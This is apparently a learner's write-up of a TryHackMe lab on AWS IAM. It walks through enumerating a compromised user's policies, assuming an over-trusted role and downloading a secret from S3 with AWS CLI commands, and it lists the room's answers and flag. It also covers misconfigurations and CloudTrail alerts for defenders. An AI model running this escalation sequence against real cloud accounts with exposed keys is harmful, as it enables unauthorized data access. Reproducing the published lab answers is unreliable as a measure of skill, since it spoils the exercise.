# Day 23: AWS Security — S3cret Santa

**Date:** December 23, 2025  
**Time Spent:** 1 hour  
**Difficulty:** ★★★☆ *(Official rating: Medium — first AWS exposure; commands and IAM model were new, but the logic was clear and the room moved fast)*  
**Category:** Cloud Security / AWS IAM / Privilege Escalation  
**Room:** https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6

---

## Overview

An elf found cloud credentials on Sir Carrotbane's desk. The task: use them to
enumerate the AWS account, identify what the compromised user can do, find a
privileged role that can be assumed, and access the S3 bucket holding TBFC's
sensitive files.

First time working with AWS in a hands-on context. The offensive path here is
exactly what defenders need to understand — every step an attacker takes leaves
a CloudTrail log entry.

---

## What I Learned

### AWS IAM — Four Core Components

IAM (Identity and Access Management) is how AWS controls who can do what.

**Users** — a single identity (person or application) with its own credentials.
Sir Carrotbane is a user: `sir.carrotbane`

**Groups** — collections of users sharing the same permissions. Easier to manage
at scale than assigning policies to individuals.

**Roles** — temporary identities that can be "assumed" to gain different
permissions. Roles issue temporary credentials (not permanent access keys).
The `bucketmaster` role is what we pivot to.

**Policies** — JSON documents defining what actions are allowed or denied, on
which resources. Attached to users, groups, or roles.

**Policy anatomy:**
```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123456789012:user/Alice"},
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::my-private-bucket/*"
}
```

- **Effect:** Allow or Deny
- **Principal:** Who this applies to
- **Action:** What they can do
- **Resource:** What they can do it to

**Policies can be inline** (attached directly to a user/role, lives and dies with it)
or **attached** (standalone policy that can be reused across multiple identities).

### The Privilege Escalation Path

Sir Carrotbane's credentials have a narrow set of permissions: read-only IAM
enumeration plus one critical action — `sts:AssumeRole`. He cannot directly
access S3, but he can assume a role that can.

```
sir.carrotbane (limited IAM read + sts:AssumeRole)
        ↓
Enumerate roles → find bucketmaster
        ↓
Assume bucketmaster role → get temporary credentials
        ↓
Export temporary credentials to environment
        ↓
Access S3 buckets as bucketmaster
        ↓
Download cloud_password.txt from easter-secrets-123145
```

This is a textbook IAM misconfiguration: a low-privilege user with unrestricted
`sts:AssumeRole` can pivot to any role in the account whose trust policy allows it.

### Full Command Sequence

**Step 1 — Verify identity:**
```bash
aws sts get-caller-identity
# Account: 123456789012
# UserId: i2hstx4zbyeeeifwg1tt
# Arn: arn:aws:iam::123456789012:user/sir.carrotbane
```

**Step 2 — Enumerate users and policies:**
```bash
aws iam list-users
aws iam list-user-policies --user-name sir.carrotbane
# Output: SirCarrotbanePolicy

aws iam get-user-policy --user-name sir.carrotbane --policy-name SirCarrotbanePolicy
# Reveals: IAM read permissions + sts:AssumeRole
```

**Step 3 — Find assumable roles:**
```bash
aws iam list-roles
# Finds: bucketmaster role, with sir.carrotbane listed as trusted Principal
```

**Step 4 — Read the role's permissions before assuming:**
```bash
aws iam list-role-policies --role-name bucketmaster
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

**BucketMasterPolicy (full document):**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ListAllBuckets",
      "Effect": "Allow",
      "Action": ["s3:ListAllMyBuckets"],
      "Resource": "*"
    },
    {
      "Sid": "ListBuckets",
      "Effect": "Allow",
      "Action": ["s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::easter-secrets-123145",
        "arn:aws:s3:::bunny-website-645341"
      ]
    },
    {
      "Sid": "GetObjectsFromEasterSecrets",
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::easter-secrets-123145/*"
    }
  ]
}
```

Three S3 actions: `s3:ListAllMyBuckets`, `s3:ListBucket`, `s3:GetObject`.
Two buckets in scope: `easter-secrets-123145` and `bunny-website-645341`.
GetObject only works on `easter-secrets-123145`.

**Step 5 — Assume the role:**
```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/bucketmaster \
  --role-session-name TBFC
```

Output contains three temporary credential values.

**Step 6 — Export temporary credentials:**
```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId from output>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from output>
export AWS_SESSION_TOKEN=<SessionToken from output>
```

All subsequent AWS CLI calls now use the bucketmaster role. Verify:
```bash
aws sts get-caller-identity
# Arn should now show: assumed-role/bucketmaster/TBFC
```

**Step 7 — List and access S3:**
```bash
aws s3api list-buckets
# Returns: easter-secrets-123145, bunny-website-645341

aws s3api list-objects --bucket easter-secrets-123145
# Returns: cloud_password.txt

aws s3api get-object \
  --bucket easter-secrets-123145 \
  --key cloud_password.txt \
  cloud_password.txt

cat cloud_password.txt
```

**Flag:** `THM{more_like_sir_cloudbane}`

### Common IAM Misconfigurations

**Unrestricted AssumeRole:**
```json
// Vulnerable — can assume any role
{"Action": "sts:AssumeRole", "Resource": "*"}

// Secure — only specific role
{"Action": "sts:AssumeRole", "Resource": "arn:aws:iam::123456789012:role/SpecificRole"}
```

**Wildcard permissions:**
```json
// Vulnerable
{"Action": "s3:*", "Resource": "*"}

// Secure — least privilege
{"Action": ["s3:GetObject"], "Resource": "arn:aws:s3:::specific-bucket/*"}
```

**Exposed credentials:** Access keys left in desktop files, GitHub repos,
application configs, or unencrypted logs. The entire attack in this room started
with a credential file on a desktop.

**Real-world examples the room cites:** Toyota, Accenture, and Verizon all suffered
cloud data exposure due to IAM misconfigurations — customer data and sensitive
documents exposed.

---

## Challenges

First AWS exposure. The IAM mental model — users, groups, roles, policies — clicked
quickly because the structure is logical. The harder part was the command syntax:
`aws iam` vs `aws s3api` vs `aws sts`, the specific flags (`--user-name`,
`--role-name`, `--policy-name`, `--bucket`, `--key`), and knowing the correct
command for each step. Can follow the flow in a guided room, but can't recall
commands cold yet. That's a practice problem.

The temporary credential export step was new and non-obvious — after `sts:AssumeRole`
returns credentials, you have to manually export all three environment variables
before the new role takes effect. Easy to miss.

---

## Security+ Alignment

**Domain 2.0 - Threats, Vulnerabilities and Mitigations (22%):** Cloud
misconfigurations, privilege escalation, credential exposure, data exfiltration.

**Domain 3.0 - Security Architecture (18%):** IAM, cloud identity management,
access control, least privilege principle.

**Domain 4.0 - Security Operations (28%):** Cloud security monitoring, incident
response, threat hunting in cloud environments.

---

## Evidence

![IAM Enumeration](../07-Screenshots/Day23-1.png)
*AWS CLI enumeration showing sir.carrotbane's SirCarrotbanePolicy and sts:AssumeRole
capability — the pivot point for privilege escalation.*

![S3 Data Access](../07-Screenshots/Day23-2.png)
*bucketmaster role assumed, temporary credentials exported, cloud_password.txt
downloaded from easter-secrets-123145 — flag retrieved.*

---

## Key Takeaways

**IAM components:**

| Component | What It Is | This Room |
|---|---|---|
| User | Single identity with credentials | `sir.carrotbane` |
| Role | Temporary identity that can be assumed | `bucketmaster` |
| Group | Collection of users sharing permissions | Not used here |
| Policy | JSON document defining allow/deny rules | `SirCarrotbanePolicy`, `BucketMasterPolicy` |

**Full attack command sequence:**
```bash
# 1. Identity check
aws sts get-caller-identity

# 2. Enumerate user policies
aws iam list-user-policies --user-name sir.carrotbane
aws iam get-user-policy --user-name sir.carrotbane --policy-name SirCarrotbanePolicy

# 3. Find roles
aws iam list-roles
aws iam list-role-policies --role-name bucketmaster
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy

# 4. Assume role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC

# 5. Export temporary credentials
export AWS_ACCESS_KEY_ID=<value>
export AWS_SECRET_ACCESS_KEY=<value>
export AWS_SESSION_TOKEN=<value>

# 6. Access S3
aws s3api list-buckets
aws s3api list-objects --bucket easter-secrets-123145
aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
```

**Room answers:**

| Question | Answer |
|---|---|
| Account parameter from `get-caller-identity` | `123456789012` |
| IAM component describing permissions | `policy` |
| Policy name for sir.carrotbane | `SirCarrotbanePolicy` |
| Third bucketmaster S3 action (besides GetObject, ListBucket) | `ListAllMyBuckets` |
| Contents of cloud_password.txt | `THM{more_like_sir_cloudbane}` |

**Dangerous IAM actions for Blue Team to monitor:**

| Action | Risk | Why |
|---|---|---|
| `sts:AssumeRole` on `*` | Critical | Can pivot to any role in account |
| `s3:GetObject` on `*` | High | Can read any file in any bucket |
| `iam:Get*` / `iam:List*` | Medium | Reconnaissance — mapping permissions |
| `iam:PutUserPolicy` | Critical | Can grant own user new permissions |

**CloudTrail events to alert on:**
- `AssumeRole` calls from unexpected users or IPs
- Burst of `iam:List*` calls — enumeration behavior
- High-volume `s3:GetObject` — possible exfiltration
- `GetUserPolicy` / `GetRolePolicy` — permission reading
- New `export` of AWS environment variables in logs

**Key terms:**

| Term | Definition |
|---|---|
| IAM | Identity and Access Management — AWS service controlling who can do what |
| `sts:AssumeRole` | IAM action allowing a user to temporarily take on a role's permissions |
| Temporary credentials | Short-lived AccessKeyId + SecretAccessKey + SessionToken issued by STS |
| S3 | Simple Storage Service — AWS object storage organized into buckets |
| Least privilege | Security principle: grant only the minimum permissions needed |
| Inline policy | Policy attached directly to one identity — not reusable |
| Attached policy | Standalone reusable policy that can be applied to multiple identities |
